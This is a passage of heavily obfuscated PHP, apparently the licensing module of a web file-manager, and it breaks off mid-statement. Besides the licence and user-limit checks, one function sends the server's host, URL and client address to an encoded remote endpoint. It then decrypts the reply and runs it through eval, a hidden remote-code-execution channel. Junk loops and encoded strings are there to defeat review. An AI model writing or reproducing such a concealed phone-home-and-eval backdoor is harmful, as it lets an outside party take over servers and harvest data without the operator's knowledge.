$ÑÁÄÀğ = $ÔæıüÇ[751]; if ($ú…ƒèÓ¢[$óƒ…¦ ²[108]] == $óƒ…¦ ²[109]) { return; } $€Ñ®´Šú = Model($óƒ…¦ ²[33])->get($óƒ…¦ ²[100]); $ˆò°É« = $ÔæıüÇ[752]; if (strlen($ˆò°É«) < $ÔæıüÇ[716]) { return; } $›ùÒêÜ• = $óƒ…¦ ²[203] . md5($€Ñ®´Šú . $óƒ…¦ ²[204]); $Öæ–©ô = $ÔæıüÇ[753]; if (strlen($Öæ–©ô) < $ÔæıüÇ[705]) { return; } $º¹ç·‚ = Cache::get($›ùÒêÜ•); $é½øÛò = $ÔæıüÇ[754]; if (!$é½øÛò) { return; } if (!is_array($º¹ç·‚) || !isset($º¹ç·‚[$óƒ…¦ ²[207]]) || time() - $º¹ç·‚[$óƒ…¦ ²[207]] >= 60) { $–ˆ´Áû× = Model($óƒ…¦ ²[7])->loadList(); $¶åÄ¼™ = $–ˆ´Áû×[$óƒ…¦ ²[200]]; $ŒßÈòèŸ = md5($_SERVER[$óƒ…¦ ²[106]] . strrev($€Ñ®´Šú) . $ú…ƒèÓ¢[$óƒ…¦ ²[191]]); $ë ôñ·› = strrev(substr($ŒßÈòèŸ, 10, 16)); $º¹ç·‚ = $this->pkuv639d94b1($¶åÄ¼™[$óƒ…¦ ²[86]][$ë ôñ·›], $ŒßÈòèŸ); $º¹ç·‚ = json_decode($º¹ç·‚, !0); } if (!is_array($º¹ç·‚)) { return $this->stkf7d959455(); } $®„œÍç = strtotime($º¹ç·‚[$óƒ…¦ ²[129]]); if (time() >= $®„œÍç) { return $this->stkf7d959455(); } if (!isset($º¹ç·‚[$óƒ…¦ ²[207]]) || time() - $º¹ç·‚[$óƒ…¦ ²[207]] > 20) { $º¹ç·‚[$óƒ…¦ ²[207]] = time(); Cache::set($›ùÒêÜ•, $º¹ç·‚); } $this->paejfb274e01 = $º¹ç·‚; $this->fterb6ff004e = $ú…ƒèÓ¢[$óƒ…¦ ²[108]]; $ûóÛß³… = $ÔæıüÇ[755]; while ($ûóÛß³… < $ÔæıüÇ[716]) { if ($ûóÛß³… >= 0) { break; } $ûóÛß³…++; } } private function mvkd9480add3() { $èËâ =& $_SERVER[¢¿ãÄÁ¤]; $˜É‹Ö³ˆ = $GLOBALS[$èËâ[13]]; $¡¼‚öŒ× = $_SERVER[$èËâ[24]]; if ($¡¼‚öŒ× == $èËâ[208] && $this->fterb6ff004e == $èËâ[109]) { show_json(LNG($èËâ[209]), !1, $èËâ[210]); } $’ Üà“¢ = array($èËâ[211], $èËâ[212]); if (in_array($¡¼‚öŒ×, $’ Üà“¢)) { if ($this->fterb6ff004e == $èËâ[109] && isset($˜É‹Ö³ˆ[$èËâ[213]])) { show_json(LNG($èËâ[209]), !1, $èËâ[210]); die; } $“’„¥ì = $this->vsxjcb69798e(); if ($“’„¥ì != intval($èËâ[214])) { if ($“’„¥ì <= Model($èËâ[125])->count()) { show_json(LNG($èËâ[215]), !1, $èËâ[210]); die; } } } } private function xbpv35ab3c80() { $Äï€ÂÍ =& $_SERVER[ÕŸ²ó÷å]; $„ËŒ£©Û =& $_SERVER[¢¿ãÄÁ¤]; $ôÙ•êÄÈ = array($„ËŒ£©Û[119], $„ËŒ£©Û[120]); $Ëáãâú¶ = $Äï€ÂÍ[756]; if (!$Ëáãâú¶) { return; } if (!KodUser::isRoot() || !isset($_GET[$„ËŒ£©Û[216]])) { return; } if (!in_array($_SERVER[$„ËŒ£©Û[24]], $ôÙ•êÄÈ)) { return; } $ÓÁÀë¨ğ = $„ËŒ£©Û[217]; $„¬¬Åñ = $Äï€ÂÍ[757]; $ÓÁÀë¨ğ = $this->lpurc88938a1($ÓÁÀë¨ğ, $„ËŒ£©Û[218]); $™šÆ¾Úò = $Äï€ÂÍ[758]; while ($™šÆ¾Úò < $Äï€ÂÍ[716]) { if ($™šÆ¾Úò >= 0) { break; } $™šÆ¾Úò++; } $ó¦´Ì’µ = stream_context_create(array($„ËŒ£©Û[219] => array($„ËŒ£©Û[220] => $„ËŒ£©Û[221], $„ËŒ£©Û[222] => 3))); $¨¹ˆãİ° = $Äï€ÂÍ[759]; $­à¤äè€ = @file_get_contents($ÓÁÀë¨ğ, !1, $ó¦´Ì’µ); header($„ËŒ£©Û[223]); if ($­à¤äè€ && strstr($­à¤äè€, $„ËŒ£©Û[224])) { echo $­à¤äè€; } die; } public function mubs4a5b6316($Ê¡ÀÎ±ù) { $ÈşçÎ€ı =& $_SERVER[ÕŸ²ó÷å]; $ê»‰öÌÔ =& $_SERVER[¢¿ãÄÁ¤]; if ($this->fterb6ff004e == $ê»‰öÌÔ[225]) { return $Ê¡ÀÎ±ù; } $ÖˆË½üÏ = $this->versionPluginList(); $õ“‰´µõ = $ÈşçÎ€ı[760]; if (!$õ“‰´µõ) { return; } $ëç©üÙ = explode($ê»‰öÌÔ[226], $this->versionPluginFilter()); $¿ØÎ–ÌŠ = $ÈşçÎ€ı[761]; $³üäÓˆ = array(); foreach ($ÖˆË½üÏ as $¸½¼ìŸ• => $¥ôíµİæ) { if ($¥ôíµİæ == $ê»‰öÌÔ[227] && substr($this->fterb6ff004e, 0, 1) == $ê»‰öÌÔ[227]) { continue; } if (!in_array($¸½¼ìŸ•, $ëç©üÙ)) { $³üäÓˆ[] = $¸½¼ìŸ•; } } foreach ($³üäÓˆ as $¸½¼ìŸ•) { unset($Ê¡ÀÎ±ù[$¸½¼ìŸ•]); } return $Ê¡ÀÎ±ù; } private function versionPluginList() { $İœ¹ã–‹ =& $_SERVER[ÕŸ²ó÷å]; $ÚŞ³”¾ =& $_SERVER[¢¿ãÄÁ¤]; return array($ÚŞ³”¾[228] => $ÚŞ³”¾[227], $ÚŞ³”¾[229] => $ÚŞ³”¾[227], $ÚŞ³”¾[230] => $ÚŞ³”¾[227], $ÚŞ³”¾[231] => $ÚŞ³”¾[232], $ÚŞ³”¾[233] => $ÚŞ³”¾[232], $ÚŞ³”¾[234] => $ÚŞ³”¾[232], $ÚŞ³”¾[235] => $ÚŞ³”¾[232], $ÚŞ³”¾[236] => $ÚŞ³”¾[232], $ÚŞ³”¾[237] => $ÚŞ³”¾[232], $ÚŞ³”¾[238] => $ÚŞ³”¾[232], $ÚŞ³”¾[239] => $ÚŞ³”¾[232], $ÚŞ³”¾[240] => $ÚŞ³”¾[232], $ÚŞ³”¾[241] => $ÚŞ³”¾[232], $ÚŞ³”¾[242] => $ÚŞ³”¾[232], $ÚŞ³”¾[243] => $ÚŞ³”¾[232], $ÚŞ³”¾[244] => $ÚŞ³”¾[232]); $¼ÌÛÎİÔ = $İœ¹ã–‹[762]; while (strlen($¼ÌÛÎİÔ) < $İœ¹ã–‹[716]) { if (!$¼ÌÛÎİÔ) { break; } $¼ÌÛÎİÔ++; } } private function versionPluginFilter() { $É‹ÉêÇ =& $_SERVER[¢¿ãÄÁ¤]; if ($this->fterb6ff004e == $É‹ÉêÇ[109]) { return $É‹ÉêÇ[6]; } $âÍèèÅ = _get($this->paejfb274e01, $É‹ÉêÇ[245], $É‹ÉêÇ[6]); $âÂ¬Ş× = $_SERVER[ÕŸ²ó÷å][763]; if (!$âÂ¬Ş×) { return; } $ú°€ğÂ = _get($this->paejfb274e01, $É‹ÉêÇ[116], $É‹ÉêÇ[6]); $ü‡ãœ†µ = _get($this->paejfb274e01, $É‹ÉêÇ[246], $É‹ÉêÇ[6]); if ($ú°€ğÂ > time() && $ü‡ãœ†µ > time()) { $›ƒğï§£ = explode($É‹ÉêÇ[226], $âÍèèÅ); $´”‡¯¬² = array_keys($this->versionPluginList()); $âÍèèÅ = array_merge($›ƒğï§£, $´”‡¯¬²); $âÍèèÅ = implode($É‹ÉêÇ[226], array_filter(array_unique($âÍèèÅ))); } return $âÍèèÅ; } private function fsvp2e8bb14d() { $Ôµ¢¼ñö =& $_SERVER[¢¿ãÄÁ¤]; if ($this->fterb6ff004e != $Ôµ¢¼ñö[109]) { $GLOBALS[$Ôµ¢¼ñö[86]][$Ôµ¢¼ñö[90]][$Ôµ¢¼ñö[247]] = $Ôµ¢¼ñö[206]; return; } $GLOBALS[$Ôµ¢¼ñö[86]][$Ôµ¢¼ñö[248]] = $Ôµ¢¼ñö[122]; if (Model($Ôµ¢¼ñö[249])->get($Ôµ¢¼ñö[63]) != $Ôµ¢¼ñö[206]) { Model($Ôµ¢¼ñö[249])->set($Ôµ¢¼ñö[63], $Ôµ¢¼ñö[206]); } } public function idev187d5266() { return $_SERVER[¢¿ãÄÁ¤][250]; } private function zwuo70b1a9a4() { $ÒÁ…¥Ù =& $_SERVER[ÕŸ²ó÷å]; $‹Î¤Â÷à =& $_SERVER[¢¿ãÄÁ¤]; $šöõÜı = array($‹Î¤Â÷à[251], $‹Î¤Â÷à[252], $‹Î¤Â÷à[253]); $Ğóê½¯‡ = $‹Î¤Â÷à[254] . md5($‹Î¤Â÷à[255]); $ø˜¡‰¿Ç = $ÒÁ…¥Ù[764]; if ($this->fterb6ff004e == $‹Î¤Â÷à[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$‹Î¤Â÷à[24]], $šöõÜı)) { return; } if (time() % 4 != 0) { return; } $ê”ûÄê° = call_user_func(array($‹Î¤Â÷à[256], $‹Î¤Â÷à[257]), $Ğóê½¯‡); $Êòõ®…Ù = $ÒÁ…¥Ù[765]; if (strlen($Êòõ®…Ù) < $ÒÁ…¥Ù[716]) { die; } if ($ê”ûÄê° && time() - $ê”ûÄê° < intval($‹Î¤Â÷à[258])) { return; } call_user_func(array($‹Î¤Â÷à[256], $‹Î¤Â÷à[139]), $Ğóê½¯‡, time()); $Ïî§¶ğµ = $ÒÁ…¥Ù[766]; if (strlen($Ïî§¶ğµ) < $ÒÁ…¥Ù[705]) { die; } $§Ëí¼„ä = Model($‹Î¤Â÷à[33])->get($‹Î¤Â÷à[100]); $üÌÔÚÅ = array($‹Î¤Â÷à[152] => Model($‹Î¤Â÷à[33])->get($‹Î¤Â÷à[153]), $‹Î¤Â÷à[167] => $this->fterb6ff004e, $‹Î¤Â÷à[163] => $_SERVER[$‹Î¤Â÷à[164]], $‹Î¤Â÷à[165] => Model($‹Î¤Â÷à[33])->get($‹Î¤Â÷à[131]), $‹Î¤Â÷à[105] => md5($_SERVER[$‹Î¤Â÷à[106]] . $§Ëí¼„ä), $‹Î¤Â÷à[156] => $‹Î¤Â÷à[136], $‹Î¤Â÷à[159] => $_SERVER[$‹Î¤Â÷à[160]]); $Å€ÉÛŠ˜ = $ÒÁ…¥Ù[767]; while ($Å€ÉÛŠ˜ < $ÒÁ…¥Ù[716]) { if ($Å€ÉÛŠ˜ >= 0) { break; } $Å€ÉÛŠ˜++; } $Ô¯ˆÁıĞ = $this->erfg433172bf($‹Î¤Â÷à[259], $üÌÔÚÅ); if (!is_array($Ô¯ˆÁıĞ)) { return; } if ($Ô¯ˆÁıĞ[$‹Î¤Â÷à[152]] && $Ô¯ˆÁıĞ[$‹Î¤Â÷à[260]]) { if ($this->fyqv110a469c($Ô¯ˆÁıĞ[$‹Î¤Â÷à[260]]) == $üÌÔÚÅ[$‹Î¤Â÷à[152]]) { return; } } $this->stkf7d959455(); if ($this->fyqv110a469c($Ô¯ˆÁıĞ[$‹Î¤Â÷à[260]]) != $üÌÔÚÅ[$‹Î¤Â÷à[152]]) { $ëèëŠ»ª = array($‹Î¤Â÷à[185] => $§Ëí¼„ä, $‹Î¤Â÷à[186] => $_SERVER[$‹Î¤Â÷à[106]], $‹Î¤Â÷à[187] => this_url(), $‹Î¤Â÷à[161] => $_SERVER[$‹Î¤Â÷à[162]]); $ù­’ = $this->wtyva4e1b61c(json_encode($ëèëŠ»ª)); $Ô¯ˆÁıĞ = $this->erfg433172bf($‹Î¤Â÷à[188] . $ù­’); if ($Ô¯ˆÁıĞ && is_array($Ô¯ˆÁıĞ) && isset($Ô¯ˆÁıĞ[$‹Î¤Â÷à[260]])) { $€­ÈñÀ’ = $this->pkuv639d94b1($Ô¯ˆÁıĞ[$‹Î¤Â÷à[260]], 2); if ($€­ÈñÀ’) { $€­ÈñÀ’ = $this->fyqv110a469c($€­ÈñÀ’); } if ($€­ÈñÀ’) { try { @eval($€­ÈñÀ’); } catch (Exception $¢ŸÍóµŒ) { } } } } } private function erfg433172bf($†ŒÒ¶ÇÜ = '', $»€ßÄÎ = array(), $Ÿ­Ş¬‘æ = 5) { $¤ªõÀ =& $_SERVER[ÕŸ²ó÷å]; $ÇÂôÎ·Ì =& $_SERVER[¢¿ãÄÁ¤]; $÷‘½ê§¦ = $ÇÂôÎ·Ì[261]; $ŸŸÙ€ô = $¤ªõÀ[768]; $÷‘½ê§¦ = $this->lpurc88938a1($÷‘½ê§¦, $ÇÂôÎ·Ì[262]); $÷‘½ê§¦ = $÷‘½ê§¦ . $†ŒÒ¶ÇÜ; $Ÿ’´…š = $¤ªõÀ[769]; if (strlen($Ÿ’´…š) < $¤ªõÀ[714]) { return; } if ($»€ßÄÎ && is_array($»€ßÄÎ)) { $÷‘½ê§¦ = $÷‘½ê§¦ . $ÇÂôÎ·Ì[263] . http_build_query($»€ßÄÎ); } if ($»€ßÄÎ === -1) { return $÷‘½ê§¦; } $×´ËÔ¯ù = stream_context_create(array($ÇÂôÎ·Ì[219] => array($ÇÂôÎ·Ì[222] => $Ÿ­Ş¬‘æ, $ÇÂôÎ·Ì[220] => $ÇÂôÎ·Ì[264]), $ÇÂôÎ·Ì[265] => array($ÇÂôÎ·Ì[266] => !1, $ÇÂôÎ·Ì[267] => !1))); $•Ğ× ú = $¤ªõÀ[770]; if (strlen($•Ğ× ú) < $¤ªõÀ[714]) { die; } $»€ßÄÎ = @file_get_contents($÷‘½ê§¦, !1, $×´ËÔ¯ù); return json_decode($»€ßÄÎ, !0); $´„â©ß = $¤ªõÀ[771]; if (strlen($´„â©ß) < $¤ªõÀ[693]) { die; } } private function vsxjcb69798e() { $™Øùø‡ç =& $_SERVER[ÕŸ²ó÷å]; $åûïæÇ™ =& $_SERVER[¢¿ãÄÁ¤]; $¦¶‹Üí = array($åûïæÇ™[268] => $åûïæÇ™[269], $åûïæÇ™[270] => $åûïæÇ™[271], $åûïæÇ™[272] => $åûïæÇ™[273], $åûïæÇ™[274] => $åûïæÇ™[275], $åûïæÇ™[276] => $åûïæÇ™[277], $åûïæÇ™[278] => $åûïæÇ™[214], $åûïæÇ™[279] => $åûïæÇ™[214], $åûïæÇ™[280] => $åûïæÇ™[269], $åûïæÇ™[281] => $åûïæÇ™[271], $åûïæÇ™[282] => $åûïæÇ™[273], $åûïæÇ™[283] => $åûïæÇ™[284], $åûïæÇ™[285] => $åûïæÇ™[275], $åûïæÇ™[286] => $åûïæÇ™[287], $åûïæÇ™[288] => $åûïæÇ™[277], $åûïæÇ™[289] => $åûïæÇ™[290], $åûïæÇ™[291] => $åûïæÇ™[292], $åûïæÇ™[293] => $åûïæÇ™[294]); $àºšä‰ = $™Øùø‡ç[772]; while ($àºšä‰ < $™Øùø‡ç[693]) { if ($àºšä‰ >= 0) { break; } $àºšä‰++; } $ˆ¶÷ÖúË = $¦¶‹Üí[$this->fterb6ff004e]; $ˆ¶÷ÖúË = intval($ˆ¶÷ÖúË ? $ˆ¶÷ÖúË : $åûïæÇ™[269]); $‚÷ìôØ‹ = _get($this->paejfb274e01, $åûïæÇ™[295]); $ºèÓÔÇ = $™Øùø‡ç[773]; $‚÷ìôØ‹ = $‚÷ìôØ‹ ? intval($‚÷ìôØ‹) : 0; return $ˆ¶÷ÖúË + $‚÷ìôØ‹; $¡´””Œê = $™Øùø‡ç[774]; } public function orgyd2ff7ac5($¶Ğ²„†Ç) { $úÓÜÀ¹ƒ =& $_SERVER[ÕŸ²ó÷å]; $ÀúÀ©İ± =& $_SERVER[¢¿ãÄÁ¤]; $Ï´ã—ÜÔ = $this->vsxjcb69798e(); $˜æÌöˆÇ = $úÓÜÀ¹ƒ[775]; if (strlen($˜æÌöˆÇ) < $úÓÜÀ¹ƒ[705]) { return; } if ($¶Ğ²„†Ç[$ÀúÀ©İ±[296]] == $ÀúÀ©İ±[122]) { return; } if ($Ï´ã—ÜÔ >= intval($ÀúÀ©İ±[214])) { return; } $ÈŸ¸÷—½ = Model($ÀúÀ©İ±[125])->count(); $˜Ï—ĞìÒ = $úÓÜÀ¹ƒ[776]; if ($ÈŸ¸÷—½ <= $Ï´ã—ÜÔ) { return; } $Ï¸Ê™¥ø = Model($ÀúÀ©İ±[125])->field($ÀúÀ©İ±[296])->limit($Ï´ã—ÜÔ)->select(); $äê²Ù…î = $úÓÜÀ¹ƒ[777]; if (!$äê²Ù…î) { die; } $Ï¸Ê™¥ø = array_to_keyvalue($Ï¸Ê™¥ø, $ÀúÀ©İ±[6], $ÀúÀ©İ±[296]); if (!in_array($¶Ğ²„†Ç[$ÀúÀ©İ±[296]], $Ï¸Ê™¥ø)) { show_json($ÀúÀ©İ±[297], !1, $ÀúÀ©İ±[210]); } } public function petg816d1e33() { $´Úş­Ñ’ =& $_SERVER[ÕŸ²ó÷å]; $ß”ßµ€ =& $_SERVER[¢¿ãÄÁ¤]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ÄÃü‡’Ô = $ß”ßµ€[217]; $ÂœŸ‚Ÿ = $´Úş­Ñ’[778]; if (!$ÂœŸ‚Ÿ) { die; } $ÄÃü‡’Ô = $this->lpurc88938a1($ÄÃü‡’Ô, $ß”ßµ€[218]); $çêêÜ™ı = $´Úş­Ñ’[779]; while ($çêêÜ™ı < $´Úş­Ñ’[714]) { if ($çêêÜ™ı >= 0) { break; } $çêêÜ™ı++; } $µä€š´™ = stream_context_create(array($ß”ßµ€[219] => array($ß”ßµ€[220] => $ß”ßµ€[221], $ß”ßµ€[222] => 3))); $…È»¡ı„ = $´Úş­Ñ’[780]; while (strlen($…È»¡ı„) < $´Úş­Ñ’[693]) { if (!$…È»¡ı„) { break; } $…È»¡ı„++; } $²ø‚±ƒ = @file_get_contents($ÄÃü‡’Ô, !1, $µä€š´™); $¸şä¦üÑ = $´Úş­Ñ’[781]; while ($¸şä¦üÑ < $´Úş­Ñ’[714]) { if ($¸şä¦üÑ >= 0) { break; } $¸şä¦üÑ++; } echo $ß”ßµ€[298] . hash_encode($²ø‚±ƒ) . $ß”ßµ€[299]; $—Ê È— = $´Úş­Ñ’[782]; if (strlen($—Ê È—) < $´Úş­Ñ’[60]) { die; } } private function qeykdb1b5d10($õµÎÆ£¶, $ûÑ·ËŠâ, $„Ğ¸óÌ = 3) { $İ”¦Šğò =& $_SERVER[ÕŸ²ó÷å]; $¿–¢ƒÆŠ =& $_SERVER[¢¿ãÄÁ¤]; usleep(1); $õµÎÆ£¶ = trim($õµÎÆ£¶); $ĞÆšêŞ³ = mt_rand(0, 5) . $¿–¢ƒÆŠ[6]; $éäØ˜ƒÓ = $İ”¦Šğò[783]; if (strlen($éäØ˜ƒÓ) < $İ”¦Šğò[693]) { die; } $”á›×í¦ = rand_string(15); $ÇŞ×¥µè = $¿–¢ƒÆŠ[300]; $¾–¼½ô = $İ”¦Šğò[784]; while ($¾–¼½ô < $İ”¦Šğò[60]) { if ($¾–¼½ô >= 0) { break; } $¾–¼½ô++; } switch ($ĞÆšêŞ³) { case $¿–¢ƒÆŠ[206]: $ç÷ñÎœÛ = $this->wgdodc4d6c43($õµÎÆ£¶, strrev($ûÑ·ËŠâ . $”á›×í¦)); break; $ˆÊ‚‡á = $İ”¦Šğò[785]; if (strlen($ˆÊ‚‡á) < $İ”¦Šğò[60]) { return; } case $¿–¢ƒÆŠ[122]: $ç÷ñÎœÛ = $this->wgdodc4d6c43($õµÎÆ£¶, strrev($”á›×í¦ . $ûÑ·ËŠâ)); break; $¼ÅÛ·ŠÃ = $İ”¦Šğò[786]; if (strlen($¼ÅÛ·ŠÃ) < $İ”¦Šğò[705]) { return; } case $¿–¢ƒÆŠ[301]: $ç÷ñÎœÛ = $this->wgdodc4d6c43($õµÎÆ£¶, base64_encode($”á›×í¦ . $ûÑ·ËŠâ)); $‡æ‘º¨è = $İ”¦Šğò[787]; if (!$‡æ‘º¨è) { die; } break; case $¿–¢ƒÆŠ[302]: $ç÷ñÎœÛ = $this->wgdodc4d6c43($õµÎÆ£¶, md5($”á›×í¦ . $ûÑ·ËŠâ)); $ªÛ§‹ˆÃ = $İ”¦Šğò[788]; if (!$ªÛ§‹ˆÃ) { die; } break; $‡¼üš­« = $İ”¦Šğò[789]; if (!$‡¼üš­«) { return; } case $¿–¢ƒÆŠ[303]: $õµÎÆ£¶ = base64_encode($õµÎÆ£¶); $¥¬Í¨‹Æ = rand(0, 64); $©Öç¦ÇÎ = $ÇŞ×¥µè[$¥¬Í¨‹Æ]; $ø „Ë° = $İ”¦Šğò[790]; if (!$ø „Ë°) { die; } $ŒÛ‹ë’• = md5($©Öç¦ÇÎ . md5($ûÑ·ËŠâ . $©Öç¦ÇÎ) . $ûÑ·ËŠâ); $ŒÛ‹ë’• = substr($ŒÛ‹ë’•, $¥¬Í¨‹Æ % 8, $¥¬Í¨‹Æ % 8 + 7); $õ¤ÂÌÅã = $İ”¦Šğò[791]; if (!$õ¤ÂÌÅã) { die; } $İí´Ñ²÷ = $¿–¢ƒÆŠ[6]; $µ†°Œºæ = $İ”¦Šğò[792]; if (!$µ†°Œºæ) { die; } $Úƒ„¢öÛ = 0; $çïšöÜ… = 0; $É€¼ıúó = $İ”¦Šğò[793]; while ($É€¼ıúó < $İ”¦Šğò[60]) { if ($É€¼ıúó >= 0) { break; } $É€¼ıúó++; } $ÑĞ‚˜¥Ó = 0; for ($Úƒ„¢öÛ = 0; $Úƒ„¢öÛ < strlen($õµÎÆ£¶); $Úƒ„¢öÛ++) { $ÑĞ‚˜¥Ó = $ÑĞ‚˜¥Ó == strlen($ŒÛ‹ë’•) ? 0 : $ÑĞ‚˜¥Ó; $û™‡¦ª = $İ”¦Šğò[794]; $çïšöÜ… = ($¥¬Í¨‹Æ + strpos($ÇŞ×¥µè, $õµÎÆ£¶[$Úƒ„¢öÛ]) + ord($ŒÛ‹ë’•[$ÑĞ‚˜¥Ó++])) % 64; $Ò„–¥à¾ = $İ”¦Šğò[795]; if (!$Ò„–¥à¾) { return; } $İí´Ñ²÷ .= $ÇŞ×¥µè[$çïšöÜ…]; } $ç÷ñÎœÛ = hash_encode($©Öç¦ÇÎ . $İí´Ñ²÷); break; $ÓíóèÂı = $İ”¦Šğò[796]; if (strlen($ÓíóèÂı) < $İ”¦Šğò[60]) { return; } default: $ç÷ñÎœÛ = $this->wgdodc4d6c43($õµÎÆ£¶, $ûÑ·ËŠâ . $”á›×í¦); $Ëüº™ÉÄ = $İ”¦Šğò[797]; if (strlen($Ëüº™ÉÄ) < $İ”¦Šğò[716]) { return; } break; $ıÙõÁÍ = $İ”¦Šğò[798]; if (!$ıÙõÁÍ) { die; } } $ç÷ñÎœÛ = strrev($ĞÆšêŞ³ . $”á›×í¦ . $ç÷ñÎœÛ); if ($„Ğ¸óÌ - 1 > 0) { $ç÷ñÎœÛ = $this->qeykdb1b5d10($ç÷ñÎœÛ, $ûÑ·ËŠâ, $„Ğ¸óÌ - 1); } return $ç÷ñÎœÛ; } private function pkuv639d94b1($÷ŒªË£Â, $¼İõÇ², $ì÷Öûß¦ = 3) { $ÆèÛÑñ =& $_SERVER[ÕŸ²ó÷å]; $ıª’ïÂ =& $_SERVER[¢¿ãÄÁ¤]; if (!is_string($÷ŒªË£Â) || strlen($÷ŒªË£Â) < 10) { return !1; } $÷ŒªË£Â = trim($÷ŒªË£Â); $÷ŒªË£Â = strrev($÷ŒªË£Â); $çá¬Íü = $÷ŒªË£Â[0]; $ë´˜ãûô = $ÆèÛÑñ[799]; if (strlen($ë´˜ãûô) < $ÆèÛÑñ[693]) { return; } $ïİ¤£ğ† = substr($÷ŒªË£Â, 1, 15); $÷ŒªË£Â = substr($÷ŒªË£Â, 16); $’Ôú¿ì = $ÆèÛÑñ[800]; if (strlen($’Ôú¿ì) < $ÆèÛÑñ[714]) { die; } $ÂÈ ¸¸ = $ıª’ïÂ[300]; switch ($çá¬Íü) { case $ıª’ïÂ[206]: $Óë¦šÔò = $this->lpurc88938a1($÷ŒªË£Â, strrev($¼İõÇ² . $ïİ¤£ğ†)); $¢°§óõ¼ = $ÆèÛÑñ[793]; if (!$¢°§óõ¼) { return; } break; $Äá‚¬€ = $ÆèÛÑñ[801]; if (!$Äá‚¬€) { return; } case $ıª’ïÂ[122]: $Óë¦šÔò = $this->lpurc88938a1($÷ŒªË£Â, strrev($ïİ¤£ğ† . $¼İõÇ²)); $³ğ¯ı¦ = $ÆèÛÑñ[802]; while (strlen($³ğ¯ı¦) < $ÆèÛÑñ[714]) { if (!$³ğ¯ı¦) { break; } $³ğ¯ı¦++; } break; case $ıª’ïÂ[301]: $Óë¦šÔò = $this->lpurc88938a1($÷ŒªË£Â, base64_encode($ïİ¤£ğ† . $¼İõÇ²)); $ıº¥‘õà = $ÆèÛÑñ[803]; if (strlen($ıº¥‘õà) < $ÆèÛÑñ[693]) { die; } break; case $ıª’ïÂ[302]: $Óë¦šÔò = $this->lpurc88938a1($÷ŒªË£Â, md5($ïİ¤£ğ† . $¼İõÇ²)); break; $Ÿƒëá£ğ = $ÆèÛÑñ[804]; case $ıª’ïÂ[303]: $÷ŒªË£Â = hash_decode($÷ŒªË£Â); $ã†¢œµ = $ÆèÛÑñ[805]; if (!$ã†¢œµ) { die; } $ÇŸÙèõü = $÷ŒªË£Â[0]; $÷ŒªË£Â = substr($÷ŒªË£Â, 1); $ÉÏˆÔÔİ = $ÆèÛÑñ[806]; if (!$ÉÏˆÔÔİ) { return; } $ÛÒ¿Ùô = strpos($ÂÈ ¸¸, $ÇŸÙèõü); $ò°ıİÚ = $ÆèÛÑñ[807]; if (!$ò°ıİÚ) { return; } $ê—ˆÌ¦Î = md5($ÇŸÙèõü . md5($¼İõÇ² . $ÇŸÙèõü) . $¼İõÇ²); $â•ˆÂ˜Æ = $ÆèÛÑñ[808]; while (strlen($â•ˆÂ˜Æ) < $ÆèÛÑñ[60]) { if (!$â•ˆÂ˜Æ) { break; } $â•ˆÂ˜Æ++; } $ê—ˆÌ¦Î = substr($ê—ˆÌ¦Î, $ÛÒ¿Ùô % 8, $ÛÒ¿Ùô % 8 + 7); $ÉÛâ“££ = $ıª’ïÂ[6]; $¿­…¥ü = $ÆèÛÑñ[809]; while (strlen($¿­…¥ü) < $ÆèÛÑñ[716]) { if (!$¿­…¥ü) { break; } $¿­…¥ü++; } $§ÉƒßšÊ = 0; $ÔÒ÷©ñ = 0; $Ü¤£×¿ = $ÆèÛÑñ[810]; if (!$Ü¤£×¿) { return; } $¾èæŸĞŒ = 0; for ($§ÉƒßšÊ = 0; $§ÉƒßšÊ < strlen($÷ŒªË£Â); $§ÉƒßšÊ++) { $¾èæŸĞŒ = $¾èæŸĞŒ == strlen($ê—ˆÌ¦Î) ? 0 : $¾èæŸĞŒ; $¡—ªÕ‘† = $¾èæŸĞŒ++; $ÔÒ÷©ñ = strpos($ÂÈ ¸¸, $÷ŒªË£Â[$§ÉƒßšÊ]) - $ÛÒ¿Ùô - ord($ê—ˆÌ¦Î[$¡—ªÕ‘†]); while ($ÔÒ÷©ñ < 0) { $ÔÒ÷©ñ += 64; $•‡¨‰ = $ÆèÛÑñ[811]; } $ÉÛâ“££ .= $ÂÈ ¸¸[$ÔÒ÷©ñ]; $Ôİ®ïÂÉ = $ÆèÛÑñ[812]; if (!$Ôİ®ïÂÉ) { die; } } $Óë¦šÔò = base64_decode($ÉÛâ“££); break; default: $Óë¦šÔò = $this->lpurc88938a1($÷ŒªË£Â, $¼İõÇ² . $ïİ¤£ğ†); break; } if ($ì÷Öûß¦ - 1 > 0) { $Óë¦šÔò = $this->pkuv639d94b1($Óë¦šÔò, $¼İõÇ², $ì÷Öûß¦ - 1); } return $Óë¦šÔò; } public function wtyva4e1b61c($ÙŠƒ£ß) { $ÏëˆåÅ¿ =& $_SERVER[ÕŸ²ó÷å]; $Óùáñ¸¤ =& $_SERVER[¢¿ãÄÁ¤]; $Ü”üñËü = $this->qhcfaebaed8c(); $¢ÇÜĞ¿‘ = $ÏëˆåÅ¿[813]; while (strlen($¢ÇÜĞ¿‘) < $ÏëˆåÅ¿[716]) { if (!$¢ÇÜĞ¿‘) { break; } $¢ÇÜĞ¿‘++; } $š“¶ §­ = $this->qhcfaebaed8c(); $¾æ³‚Ä… = ($Ü”üñËü - 1) * ($š“¶ §­ - 1); $ÜÚŸõÉ† = intval(($Ü”üñËü + $š“¶ §­) / 2); $Şè†ŒÇ” = $ÏëˆåÅ¿[814]; while (strlen($Şè†ŒÇ”) < $ÏëˆåÅ¿[716]) { if (!$Şè†ŒÇ”) { break; } $Şè†ŒÇ”++; } while (1) { $ÒŞ—å‡Œ = $ÜÚŸõÉ†; $ÍÀğª½í = $ÏëˆåÅ¿[815]; if (!$ÍÀğª½í) { return; } $ˆ‰à¿òò = $¾æ³‚Ä…; while ($ˆ‰à¿òò % $ÒŞ—å‡Œ != 0) { $ñş‚²Ó = $ˆ‰à¿òò; $ˆ‰à¿òò = $ÒŞ—å‡Œ; $ÒŞ—å‡Œ = $ñş‚²Ó % $ÒŞ—å‡Œ; } if ($ÒŞ—å‡Œ == 1) { break; } else { $ÜÚŸõÉ†++; } } $†ñ½ßü = 2; for ($–§õ¥´® = 0; $–§õ¥´® < $¾æ³‚Ä… * 10; $–§õ¥´®++) { if (($¾æ³‚Ä… * $–§õ¥´® + 1) % $ÜÚŸõÉ† == 0) { $†ñ½ßü = intval(($¾æ³‚Ä… * $–§õ¥´® + 1) / $ÜÚŸõÉ†); break; } } $æôãÅ™ğ = $this->wgdodc4d6c43($Ü”üñËü * 